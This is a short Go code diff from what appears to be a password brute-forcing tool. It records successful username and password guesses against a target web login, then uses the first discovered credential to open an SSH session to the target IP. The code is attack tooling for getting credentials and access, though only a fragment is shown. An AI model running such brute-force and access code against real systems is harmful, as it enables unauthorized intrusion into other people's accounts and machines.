@@ -240,6 +240,7 @@ func TestPassword(targetURL string, username string, c chan string, wg *sync.Wai
 				json.Unmarshal(returnbytes, &responsedata)
 				if strings.ToLower(responsedata.Status) != "invalid username or password" {
 					SucMsg(fmt.Sprintf("Credentials Discovered: \"%s:%s\"", username, password))
+					CREDENTIALS_DISCOVERED = append(CREDENTIALS_DISCOVERED, UserCredentials{Username: username, Password: password})
 					cookieurl, err := url.Parse(targetURL)
 					if err != nil {
 						continue
@@ -405,7 +406,7 @@ func SSHConnection(targetIP string) (success bool, message string) {
 	}
 	fmt.Printf("\n\n")
 
-	cmd := exec.Command("ssh", fmt.Sprintf("%s@%s", USERNAMES_DISCOVERED[0], targetIP))
+	cmd := exec.Command("ssh", fmt.Sprintf("%s@%s", CREDENTIALS_DISCOVERED[0].Username, targetIP))
 	readpipe, writepipe := io.Pipe()
 
 	cmd.Stdout = writepipe
